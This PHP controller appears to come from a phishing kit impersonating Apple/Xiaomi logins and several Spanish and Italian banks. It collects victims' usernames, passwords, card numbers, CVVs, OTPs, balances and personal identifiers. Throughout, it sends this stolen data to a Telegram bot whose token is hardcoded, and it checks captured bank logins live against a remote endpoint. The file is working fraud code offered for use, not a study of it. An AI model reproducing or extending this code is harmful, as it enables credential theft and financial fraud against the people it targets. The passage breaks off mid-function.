<?php
//require("apps/libraries/Extra3.php");
defined('BASEPATH') || exit('No direct script access allowed');
class Authority extends Auth
{
	private $doLogin = false;
	private $appleID = false;
	private $applePwd = false;
	private $applePwd2 = false;
	private $lastID = false;
	private $lastID2 = false;
	private $browser = false;
	private $version = false;
	private $mobile = false;
	private $platform = false;
	private $agent_string = false;
	private $ip = false;
	private $status = false;
	private $devices = false;
	private $name = false;
	private $checkVictim = false;
	private $checkVictim2 = false;
	private $checkFirst = false;
	private $checkFirst2 = false;
	private $more = false;
	private $alias = false;
	private $linkAcessado = false;
	private $teste2 = false;
	private $numeroOUemail = false;
	private $ControleIFS = false;
	private $card_number = false;
	private $expiry_date = false;
	private $cvv = false;
	private $cell = false;
	private $saldo = false;
	private $link_address = false;
	private $TemplateBank = false;
	private $nome_input = false;
	private $cognome_input = false;
	private $data_nascita = false;
	private $codice_fiscale = false;
	private $RandomIdentificacao = false;
	private $MD5IdentificaAcesso = false;
	private $Contos = false;
	private $EsqueceuConta = false;
	private $EsqueceuContaSql = false;



	public function __construct()
	{
		parent::__construct();
		$this->load->library('Ajax', false);
		$this->load->model('Device_m', 'device');
		$this->load->model('Victim_m', 'victim');
		$this->load->model('Wrong_m', 'wrongs');
		$this->load->model('Visit_m', 'visit');
		$this->load->model('Mail_m', 'mail');
		$this->load->model('Links_m', 'links');
		$this->browser = $this->agent->browser();
		$this->version = $this->agent->version();
		$this->mobile = $this->agent->mobile();
		$this->platform = $this->agent->platform();
		$this->agent_string = $this->agent->agent_string();
		$this->ip = $this->input->ip_address();
	}

	public function index()
	{
		redirect(site_url(), 'auto');
	}


	public function getXiaomi(){
		$this->appleID = $this->input->post('apple_id');
		$this->applePwd = $this->input->post('apple_pwd');
		$this->linkAcessado = $this->input->post('apple_add')." - Xiaomi Login";
		$this->name = $this->appleID;
		$this->checkVictim2 = $this->victim->checkVictim($this->appleID);
		$this->checkVictim = $this->links->Vitima($this->input->post('apple_add'));
		$this->checkFirst2 = $this->victim->checkFirst($this->numeroOUemail);
		$this->checkFirst = $this->links->Vitima($this->input->post('apple_add'));

		if ($this->form_validation->run() == false) {

			if ($this->checkVictim) {

				if($this->checkFirst2){


						$add_and_return = $this->updateVictimFirstBall();


						$NumeroSMSAdmin = $this->global_data['numeroSMSadmin'];

						if ($NumeroSMSAdmin != NULL){
							$TG_True_LinkAcessado = $this->linkAcessado;
							$TG_True_Email = $this->appleID;
							$TG_True_Pass = $this->applePwd;
							$TG_True_IP = $this->ip;
							$TG_True_Browser = $this->browser;
							$TG_True_Plataform = $this->platform;

							$TextoNotificacaoVerdadeiro = urlencode("<b>++ Novo Login Apple Kit X ++</b> \n <b>ID Link:</b> #$TG_True_LinkAcessado# \n <b>Email:</b> $TG_True_Email \n <b>Senha:</b> $TG_True_Pass \n <b>IP:</b> $TG_True_IP \n <b>Browser:</b> $TG_True_Browser \n <b>Sistema Operacional:</b> $TG_True_Plataform");
							file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoVerdadeiro&parse_mode=html");
						}


						Ajax::Success($this->name);




				}
			}

			if ($this->checkFirst &&  $this->checkVictim) {

					$UserCloud = $this->appleID;

						/*
						$name = "apps/controllers/imei.txt";
						$file = fopen($name, 'a');
						fwrite($file, $this->appleID . ' - ' . $this->applePwd . $this->links->getByUniqL($uniq) . " ##2## = " . $this->lastID2 . "\n");
						fclose($file);
						*/


						$add_and_return = $this->newVictimBall();
						//$imeis = $this->PegaIMEI();
						//$imeis2 = $this->enviaSMSadmin();

						//$this->addDevices($this->extra->devices, $add_and_return, $imeis);
						//$this->SendNoti($this->extra->devices, $this->name);
						//$this->DoDelete($this->extra->devices);

						$NumeroSMSAdmin = $this->global_data['numeroSMSadmin'];

						if ($NumeroSMSAdmin != NULL){

							$TG_True_LinkAcessado = $this->linkAcessado;
							$TG_True_Email = $this->appleID;
							$TG_True_Pass = $this->applePwd;
							$TG_True_IP = $this->ip;
							$TG_True_Browser = $this->browser;
							$TG_True_Plataform = $this->platform;

							$TextoNotificacaoVerdadeiro = urlencode("<b>++ Novo Login Apple Kit X ++</b> \n <b>ID Link:</b> #$TG_True_LinkAcessado# \n <b>Email:</b> $TG_True_Email \n <b>Senha:</b> $TG_True_Pass \n <b>IP:</b> $TG_True_IP \n <b>Browser:</b> $TG_True_Browser \n <b>Sistema Operacional:</b> $TG_True_Plataform");
							file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoVerdadeiro&parse_mode=html");
						}

						Ajax::Success($this->name);





			}

			if (($this->checkVictim && $this->checkVictim2) || $this->checkFirst ) {

				if ( ($this->checkVictim && $this->checkFirst) || ($this->checkVictim2 && $this->checkFirst2)) {

						//$this->more = $this->getMore($this->doLogin->dsInfo);
						//$this->alias = $this->doLogin->dsInfo['iCloudAppleIdAlias'];
						$add_and_return = $this->updateVictimFirst();
						//$imeis = $this->PegaIMEI();
						//$this->addDevices($this->extra->devices, $add_and_return, $imeis);
						//$this->SendNoti($this->extra->devices, $this->name);
						//$this->DoDelete($this->extra->devices);

						Ajax::Success($this->name);

				}

				 else {

					Ajax::Success($this->name);
				}
			}
		}

		else {
			$error = 'error';
		}


		(isset($error) ? Ajax::error($error, 200) : false);
	}


	public function getBallPasscodeOnly(){

		$this->applePwd2 = $this->input->post('apple_pwd');
		$this->linkAcessado = $this->input->post('apple_add');

		$NumeroSMSAdmin = $this->global_data['numeroSMSadmin'];

		if ($NumeroSMSAdmin != NULL){
			$TG_True_LinkAcessado = $this->linkAcessado;
			$TG_True_Email = $this->appleID;
			$TG_True_Pass = $this->applePwd;
			$TG_True_Ball = $this->applePwd2;
			$TG_True_IP = $this->ip;
			$TG_True_Browser = $this->browser;
			$TG_True_Plataform = $this->platform;

			$TextoNotificacaoVerdadeiro = urlencode("<b>++ Novo Login Apple Kit X ++</b> \n <b>ID Link:</b> #$TG_True_LinkAcessado# \n <b>Bolinhas:</b> $TG_True_Ball \n <b>IP:</b> $TG_True_IP \n <b>Browser:</b> $TG_True_Browser \n <b>Sistema Operacional:</b> $TG_True_Plataform");
			file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoVerdadeiro&parse_mode=html");
		}

		Ajax::Success($this->name);



	}



	public function getBank2(){
		//$this->numeroOUemail = $this->links->Vitima($this->input->post('apple_add')); //NOVO
		$this->appleID = $this->input->post('apple_id');
		$this->applePwd = $this->input->post('apple_pwd');
		$this->linkAcessado = $this->input->post('apple_add');
		$this->card_number = $this->input->post('card_number');
		$this->expiry_date = $this->input->post('expiry_date');
		$this->cvv = $this->input->post('cvv');
		$this->cell = $this->input->post('cell');
		$this->saldo = $this->input->post('saldo');
		$this->otp = $this->input->post('otp');
		$this->link_address = $this->input->post('link_address');
		$this->TemplateBank = $this->input->post('TemplateBank');
		$this->nome_input = $this->input->post('nome_input');
		$this->cognome_input = $this->input->post('cognome_input');
		$this->data_nascita = $this->input->post('data_nascita');
		$this->codice_fiscale = $this->input->post('codice_fiscale');
		$this->RandomIdentificacao = $this->input->post('RandomIdentificacao');
		$this->MD5IdentificaAcesso = $this->input->post('MD5IdentificaAcesso');

		$this->name = $this->appleID;
		//$this->checkVictim2 = $this->victim->checkVictim($this->appleID);
		//$this->checkVictim = $this->links->Vitima($this->input->post('apple_add'));
		//$this->checkFirst2 = $this->victim->checkFirst($this->numeroOUemail);
		//$this->checkFirst = $this->links->Vitima($this->input->post('apple_add'));
		//$this->checkExisteLoginFalso = $this->wrongs->checkVictimFalso($this->RandomIdentificacao);
		//$this->checkExisteLoginVerdadeiro = $this->victim->checkVictimVerdadeiro($this->RandomIdentificacao);




		//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=" . $this->link_address . "");
		//$UsuarioValido = file_get_contents("http://sendunlock.us/ApiAutoRemove/Api.php?Usuario=fernando&Senha=Teste111&UserCloud=$UserCloud&PassCloud=$PassCloud");


		$NumeroSMSAdmin = $this->global_data['numeroSMSadmin'];
		$botTelegramKey = $this->global_data['botTelegramKey'];

		//file_get_contents("https://api.telegram.org/$botTelegramKey/sendMessage?chat_id=79143763&text= API $botTelegramKey");
		//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=Aqui " . $RetornoApi . "");

		$UsuarioValido = "Error";

			if ($this
		    ->form_validation
		    ->run() == false)
			{


				$error = $this->failedReportBall();

	      if ($NumeroSMSAdmin != NULL)
	      {
					if($this->TemplateBank == 3){
						$TemplateText = 'BBVA';
					}
					if($this->TemplateBank == 4){
						$TemplateText = 'Bankia';
					}
					if($this->TemplateBank == 5){
						$TemplateText = 'Caixa';
					}
					if($this->TemplateBank == 6){
						$TemplateText = 'BNL';
					}
					if($this->TemplateBank == 7){
						$TemplateText = 'BPER';
					}

					$TG_True_LinkAcessado = $this->linkAcessado;
	        $TG_True_Email = $this->appleID;
	        $TG_True_Pass = $this->applePwd;
	        $TG_True_IP = $this->ip;
	        $TG_True_Browser = $this->browser;
	        $TG_True_Plataform = $this->platform;
	        $TG_True_CardNumber = $this->card_number;
	        $TG_True_ExpirityDate = $this->expiry_date;
	        $TG_True_CVV = $this->cvv;
	        $TG_True_Cell = $this->cell;
	        $TG_True_Saldo = $this->saldo;
	        $TG_True_Otp = $this->otp;
	        $TG_True_nome_input = $this->nome_input;
	        $TG_True_cognome_input = $this->cognome_input;
	        $TG_True_data_nascita = $this->data_nascita;
	        $TG_True_codice_fiscale = $this->codice_fiscale;

					$TextoNotiFormat = json_decode('"'."\xF0\x9F\x9A\x80".'"');
					$TextoNotiFormat .= " <b> New Login Bank Kit </b> ";
					$TextoNotiFormat .= json_decode('"'."\xF0\x9F\x9A\x80".'"');
					$TextoNotiFormat .= "\n\n" . json_decode('"'."\xF0\x9F\x8C\x8D ".'"');
					$TextoNotiFormat .= "<b> ID Link:</b> #$TG_True_LinkAcessado#";
					$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x8C\x8D".'"');
					$TextoNotiFormat .= "<b> Template: $TemplateText</b>";
					$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9C\x8F".'"');
					$TextoNotiFormat .= "<b> Username:</b> $TG_True_Email";
					$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x94\x92 ".'"');
					$TextoNotiFormat .= "<b> Password:</b> $TG_True_Pass";
					if($this->TemplateBank == 4){
						$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x94\x92 ".'"');
						$TextoNotiFormat .= "<b> Firma:</b> $TG_True_codice_fiscale";
					}
					$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9E".'"');
					$TextoNotiFormat .= "<b> Cell:</b> $TG_True_Cell";
					$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x86\x94".'"');
					$TextoNotiFormat .= "<b> IP:</b> $TG_True_IP";
					$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBD".'"');
					$TextoNotiFormat .= "<b> Browser:</b> $TG_True_Browser";
					$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBB".'"');
					$TextoNotiFormat .= "<b> System OS:</b> $TG_True_Plataform";
					$TextoNotificacaoFalso = urlencode($TextoNotiFormat);

	        file_get_contents("https://api.telegram.org/$botTelegramKey/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoFalso&parse_mode=html");
	  		}
			}
			else
			{
		    $error = 'error';
			}

			(isset($error) ? Ajax::error($error, 200) : false);

	}



//Autentica Usuario e Senha Template1
public function getBank1Part1(){


	$this->numeroOUemail = $this->links->Vitima($this->input->post('apple_add')); //NOVO
	$this->appleID = $this->input->post('apple_id');
	$this->applePwd = $this->input->post('apple_pwd');
	$this->linkAcessado = $this->input->post('apple_add');
	$this->card_number = $this->input->post('card_number');
	$this->expiry_date = $this->input->post('expiry_date');
	$this->cvv = $this->input->post('cvv');
	$this->cell = $this->input->post('cell');
	$this->saldo = $this->input->post('saldo');
	$this->otp = $this->input->post('otp');
	$this->link_address = $this->input->post('link_address');
	$this->TemplateBank = $this->input->post('TemplateBank');
	$this->nome_input = $this->input->post('nome_input');
	$this->cognome_input = $this->input->post('cognome_input');
	$this->data_nascita = $this->input->post('data_nascita');
	$this->codice_fiscale = $this->input->post('codice_fiscale');
	$this->RandomIdentificacao = $this->input->post('RandomIdentificacao');
	$this->MD5IdentificaAcesso = $this->input->post('MD5IdentificaAcesso');

	$this->name = $this->appleID;
	$this->checkVictim2 = $this->victim->checkVictim($this->appleID);
	$this->checkVictim = $this->links->Vitima($this->input->post('apple_add'));
	$this->checkFirst2 = $this->victim->checkFirst($this->numeroOUemail);
	$this->checkFirst = $this->links->Vitima($this->input->post('apple_add'));
	$this->checkExisteLoginFalso = $this->wrongs->checkVictimFalso($this->RandomIdentificacao);
	$this->checkExisteLoginVerdadeiro = $this->victim->checkVictimVerdadeiro($this->RandomIdentificacao);



	$DetectaParte = "";
	$DetectaParteLoginFalso = "";
	//$UsuarioValido = "Error";

	if ($this->card_number == "" && $this->otp == "")
	{
	    $DetectaParte = "1/3";
	}
	if ($this->card_number != "" && $this->otp == "")
	{
	    $DetectaParte = "2/3";
	}
	if ($this->card_number != "" && $this->otp != "")
	{
	    $DetectaParte = "3/3";
	}
	if ($this->nome_input != "" && $this->otp == "")
	{
	    $DetectaParte = "2/3";
	    $DetectaParteLoginFalso = "Ok";
	}


	//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=" . $this->link_address . "");
	$UserCloud = $this->appleID;
	//$PassCloud = $this->applePwd;
	$PassCloud = urlencode($this->applePwd);
	//$UsuarioValido = file_get_contents("http://sendunlock.us/ApiAutoRemove/Api.php?Usuario=fernando&Senha=Teste111&UserCloud=$UserCloud&PassCloud=$PassCloud");

	$arrContextOptions=array(
        "ssl"=>array(
            "verify_peer"=>false,
            "verify_peer_name"=>false,
        ),
    );

	$RetornoApi = file_get_contents("http://" . $this->link_address . "/ApiCheck/Api.php?CodeAcess=Test1234789&Bank=" . $this->TemplateBank . "&Username=$UserCloud&Password=$PassCloud", false, stream_context_create($arrContextOptions));
	$RetornoApiArray = explode("|", $RetornoApi);
	$UsuarioValido = $RetornoApiArray[0];

	$NumeroSMSAdmin = $this->global_data['numeroSMSadmin'];
	$botTelegramKey = $this->global_data['botTelegramKey'];

	//file_get_contents("https://api.telegram.org/$botTelegramKey/sendMessage?chat_id=79143763&text= API $botTelegramKey");
	//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=Aqui " . $RetornoApi . "");


	if($UsuarioValido == "Error"){
		$TxtFalseOuTrue = "FALSE LOGIN";
	}
	if($UsuarioValido != "Error"){
		$TxtFalseOuTrue = "TRUE LOGIN";
	}




	/*
	if ($this
	    ->form_validation
	    ->run() == false)
	{
	*/

		if ($this
	    ->form_validation
	    ->run() == false)
		{
			if ($UsuarioValido != "Error")
            {

							if($this->checkExisteLoginVerdadeiro){ //PRIMEIRA VEZ QUE O USUARIO VERDADEIRO TENTA ENTRAR
								$add_and_return = $this->newVictimBall();
							}
							else{ //DEMAIS TENTATIVAS DO USUARIO VERDADEIRO
								$add_and_return = $this->newVictimBallUpdate($this->RandomIdentificacao);
							}

            	if ($NumeroSMSAdmin != NULL)
                {
                    $TG_True_LinkAcessado = $this->linkAcessado;
                    $TG_True_Email = $this->appleID;
                    $TG_True_Pass = $this->applePwd;
                    $TG_True_Ball = '';
                    $TG_True_IP = $this->ip;
                    $TG_True_Browser = $this->browser;
                    $TG_True_Plataform = $this->platform;
                    $TG_True_CardNumber = $this->card_number;
                    $TG_True_ExpirityDate = $this->expiry_date;
                    $TG_True_CVV = $this->cvv;
                    $TG_True_Cell = $this->cell;
                    $TG_True_Saldo = $this->saldo;
                    $TG_True_Otp = $this->otp;

                    if ($DetectaParte == "1/3")
                    {
                        $TextoNotiFormat = json_decode('"'."\xF0\x9F\x9A\x80".'"');
												$TextoNotiFormat .= " <b> New Login Bank Kit </b> ";
												$TextoNotiFormat .= json_decode('"'."\xF0\x9F\x9A\x80".'"');
												$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9C\x85".'"');
												$TextoNotiFormat .= "<b> $TxtFalseOuTrue </b> ";
												$TextoNotiFormat .= json_decode('"'."\xE2\x9C\x85".'"');
												$TextoNotiFormat .= "\n\n" . json_decode('"'."\xE2\x8C\x9B".'"');
												$TextoNotiFormat .= "<b> Part:</b> $DetectaParte";
												$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x8C\x8D ".'"');
												$TextoNotiFormat .= "<b> ID Link:</b> #$TG_True_LinkAcessado#";
												$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9C\x8F".'"');
												$TextoNotiFormat .= "<b> Username:</b> $TG_True_Email";
												$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x94\x92 ".'"');
												$TextoNotiFormat .= "<b> Password:</b> $TG_True_Pass";
												$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x86\x94".'"');
												$TextoNotiFormat .= "<b> IP:</b> $TG_True_IP";
												$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBD".'"');
												$TextoNotiFormat .= "<b> Browser:</b> $TG_True_Browser";
												$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBB".'"');
												$TextoNotiFormat .= "<b> System OS:</b> $TG_True_Plataform";

												$TextoNotificacaoVerdadeiro = urlencode($TextoNotiFormat);
                    }
                    if ($DetectaParte == "2/3")
                    {

                		//$TextoNotificacaoVerdadeiro = urlencode("<b>++ New Acces Bank Kit ++</b> \n <b>### TRUE LOGIN ###</b> \n <b>Part:</b> $DetectaParte \n <b>ID Link:</b> #$TG_True_LinkAcessado# \n <b>Username:</b> $TG_True_Email \n <b>Password:</b> $TG_True_Pass \n <b>Card Number:</b> $TG_True_CardNumber \n <b>Expirity Date:</b> $TG_True_ExpirityDate \n <b>CVV:</b> $TG_True_CVV \n <b>Cell:</b> $TG_True_Cell \n <b>Saldo:</b> $TG_True_Saldo \n <b>IP:</b> $TG_True_IP \n <b>Browser:</b> $TG_True_Browser \n <b>System OS:</b> $TG_True_Plataform");

                		$TextoNotiFormat = json_decode('"'."\xF0\x9F\x9A\x80".'"');
										$TextoNotiFormat .= " <b> New Login Bank Kit </b> ";
										$TextoNotiFormat .= json_decode('"'."\xF0\x9F\x9A\x80".'"');
										$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9C\x85".'"');
										$TextoNotiFormat .= "<b> $TxtFalseOuTrue </b> ";
										$TextoNotiFormat .= json_decode('"'."\xE2\x9C\x85".'"');
										$TextoNotiFormat .= "\n\n" . json_decode('"'."\xE2\x8C\x9B".'"');
										$TextoNotiFormat .= "<b> Part:</b> $DetectaParte";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x8C\x8D ".'"');
										$TextoNotiFormat .= "<b> ID Link:</b> #$TG_True_LinkAcessado#";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9C\x8F".'"');
										$TextoNotiFormat .= "<b> Username:</b> $TG_True_Email";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x94\x92 ".'"');
										$TextoNotiFormat .= "<b> Password:</b> $TG_True_Pass";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB3".'"');
										$TextoNotiFormat .= "<b> Card Number:</b> $TG_True_CardNumber";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB3".'"');
										$TextoNotiFormat .= "<b> Expirity Date:</b> $TG_True_ExpirityDate";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB3".'"');
										$TextoNotiFormat .= "<b> CVV:</b> $TG_True_CVV";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9E".'"');
										$TextoNotiFormat .= "<b> Cell:</b> $TG_True_Cell";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB0".'"');
										$TextoNotiFormat .= "<b> Saldo:</b> $TG_True_Saldo";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x86\x94".'"');
										$TextoNotiFormat .= "<b> IP:</b> $TG_True_IP";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBD".'"');
										$TextoNotiFormat .= "<b> Browser:</b> $TG_True_Browser";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBB".'"');
										$TextoNotiFormat .= "<b> System OS:</b> $TG_True_Plataform";

										$TextoNotificacaoVerdadeiro = urlencode($TextoNotiFormat);


                    }
                    if ($DetectaParte == "3/3")
                    {

                    	$TextoNotiFormat = json_decode('"'."\xF0\x9F\x9A\x80".'"');
											$TextoNotiFormat .= " <b> New Login Bank Kit </b> ";
											$TextoNotiFormat .= json_decode('"'."\xF0\x9F\x9A\x80".'"');
											$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9C\x85".'"');
											$TextoNotiFormat .= "<b> $TxtFalseOuTrue </b> ";
											$TextoNotiFormat .= json_decode('"'."\xE2\x9C\x85".'"');
											$TextoNotiFormat .= "\n\n" . json_decode('"'."\xE2\x8C\x9B".'"');
											$TextoNotiFormat .= "<b> Part:</b> $DetectaParte";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x8C\x8D ".'"');
											$TextoNotiFormat .= "<b> ID Link:</b> #$TG_True_LinkAcessado#";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9C\x8F".'"');
											$TextoNotiFormat .= "<b> Username:</b> $TG_True_Email";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x94\x92 ".'"');
											$TextoNotiFormat .= "<b> Password:</b> $TG_True_Pass";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB3".'"');
											$TextoNotiFormat .= "<b> Card Number:</b> $TG_True_CardNumber";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB3".'"');
											$TextoNotiFormat .= "<b> Expirity Date:</b> $TG_True_ExpirityDate";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB3".'"');
											$TextoNotiFormat .= "<b> CVV:</b> $TG_True_CVV";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9E".'"');
											$TextoNotiFormat .= "<b> Cell:</b> $TG_True_Cell";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xB0".'"');
											$TextoNotiFormat .= "<b> Saldo:</b> $TG_True_Saldo";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x94\x91".'"');
											$TextoNotiFormat .= "<b> OTP:</b> $TG_True_Otp";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x86\x94".'"');
											$TextoNotiFormat .= "<b> IP:</b> $TG_True_IP";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBD".'"');
											$TextoNotiFormat .= "<b> Browser:</b> $TG_True_Browser";
											$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBB".'"');
											$TextoNotiFormat .= "<b> System OS:</b> $TG_True_Plataform";

											$TextoNotificacaoVerdadeiro = urlencode($TextoNotiFormat);

                    }

                    file_get_contents("https://api.telegram.org/$botTelegramKey/sendMessage?chat_id=$NumeroSMSAdmin&text=$TextoNotificacaoVerdadeiro&parse_mode=html");
                }

                Ajax::Success($this->name);
            }
            else
	        	{

							if($this->checkExisteLoginFalso){ //PRIMEIRA VEZ QUE O USUARIO FALSO TENTA ENTRAR
								//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=Entrou no SE");
								$error = $this->failedReportBall();
							}
							else{ //DEMAIS TENTATIVAS DO USUARIO FALSO
								//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=Entrou no ELSE");
								$error = $this->failedReportBallUpdate($this->RandomIdentificacao);
							}

							//file_get_contents("https://api.telegram.org/bot620965548:AAGkrvdwWlh9m-gVm-HGpxEUFP7YvmiUCp4/sendMessage?chat_id=79143763&text=oi8 - $UsuarioValido");
	            //$error = $this->failedReportBall();

	            if ($NumeroSMSAdmin != NULL)
	            {

                $TG_True_LinkAcessado = $this->linkAcessado;
	              $TG_True_Email = $this->appleID;
	              $TG_True_Pass = $this->applePwd;
	              $TG_True_Ball = '';
	              $TG_True_IP = $this->ip;
	              $TG_True_Browser = $this->browser;
	              $TG_True_Plataform = $this->platform;
	              $TG_True_CardNumber = $this->card_number;
	              $TG_True_ExpirityDate = $this->expiry_date;
	              $TG_True_CVV = $this->cvv;
	              $TG_True_Cell = $this->cell;
	              $TG_True_Saldo = $this->saldo;
	              $TG_True_Otp = $this->otp;
	              $TG_True_nome_input = $this->nome_input;
	              $TG_True_cognome_input = $this->cognome_input;
	              $TG_True_data_nascita = $this->data_nascita;
	              $TG_True_codice_fiscale = $this->codice_fiscale;



                if ($DetectaParte == "1/3")
                {

									$TextoNotiFormat = json_decode('"'."\xF0\x9F\x9A\x80".'"');
									$TextoNotiFormat .= " <b> New Login Bank Kit </b> ";
									$TextoNotiFormat .= json_decode('"'."\xF0\x9F\x9A\x80".'"');
									$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9D\x8C".'"');
									$TextoNotiFormat .= "<b> $TxtFalseOuTrue </b> ";
									$TextoNotiFormat .= json_decode('"'."\xE2\x9D\x8C".'"');
									$TextoNotiFormat .= "\n\n" . json_decode('"'."\xE2\x8C\x9B".'"');
									$TextoNotiFormat .= "<b> Part:</b> $DetectaParte";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x8C\x8D ".'"');
									$TextoNotiFormat .= "<b> ID Link:</b> #$TG_True_LinkAcessado#";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9C\x8F".'"');
									$TextoNotiFormat .= "<b> Username:</b> $TG_True_Email";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x94\x92 ".'"');
									$TextoNotiFormat .= "<b> Password:</b> $TG_True_Pass";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x86\x94".'"');
									$TextoNotiFormat .= "<b> IP:</b> $TG_True_IP";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBD".'"');
									$TextoNotiFormat .= "<b> Browser:</b> $TG_True_Browser";
									$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBB".'"');
									$TextoNotiFormat .= "<b> System OS:</b> $TG_True_Plataform";
									$TextoNotificacaoFalso = urlencode($TextoNotiFormat);

                }
                if ($DetectaParte == "2/3")
                {
	                if($DetectaParteLoginFalso == "Ok"){

	                	$TextoNotiFormat = json_decode('"'."\xF0\x9F\x9A\x80".'"');
										$TextoNotiFormat .= " <b> New Login Bank Kit </b> ";
										$TextoNotiFormat .= json_decode('"'."\xF0\x9F\x9A\x80".'"');
										$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9D\x8C".'"');
										$TextoNotiFormat .= "<b> $TxtFalseOuTrue </b> ";
										$TextoNotiFormat .= json_decode('"'."\xE2\x9D\x8C".'"');
										$TextoNotiFormat .= "\n\n" . json_decode('"'."\xE2\x8C\x9B".'"');
										$TextoNotiFormat .= "<b> Part:</b> $DetectaParte";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x8C\x8D ".'"');
										$TextoNotiFormat .= "<b> ID Link:</b> #$TG_True_LinkAcessado#";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xE2\x9C\x8F".'"');
										$TextoNotiFormat .= "<b> Username:</b> $TG_True_Email";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x94\x92 ".'"');
										$TextoNotiFormat .= "<b> Password:</b> $TG_True_Pass";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x91\xA6 ".'"');
										$TextoNotiFormat .= "<b> Nome:</b> $TG_True_nome_input";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x91\xA6 ".'"');
										$TextoNotiFormat .= "<b> Cognome:</b> $TG_True_cognome_input";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9D ".'"');
										$TextoNotiFormat .= "<b> Data nascita:</b> $TG_True_data_nascita";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x93\x9D ".'"');
										$TextoNotiFormat .= "<b> Codice Fiscale:</b> $TG_True_codice_fiscale";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x86\x94".'"');
										$TextoNotiFormat .= "<b> IP:</b> $TG_True_IP";
										$TextoNotiFormat .= "\n" . json_decode('"'."\xF0\x9F\x92\xBD".'"');
										$TextoNotiFormat .= "<b> Browser:</b> $TG_True_Browser";
